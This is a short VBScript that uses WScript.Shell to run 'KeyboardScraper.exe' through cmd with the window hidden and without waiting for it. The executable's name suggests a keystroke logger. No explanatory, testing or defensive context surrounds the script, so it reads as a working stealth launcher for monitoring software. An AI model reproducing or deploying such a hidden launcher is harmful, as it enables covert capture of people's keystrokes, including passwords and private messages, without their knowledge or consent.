Set oShell = CreateObject ("Wscript.Shell") 
Dim strArgs
strArgs = "cmd /c KeyboardScraper.exe"
oShell.Run strArgs, 0, false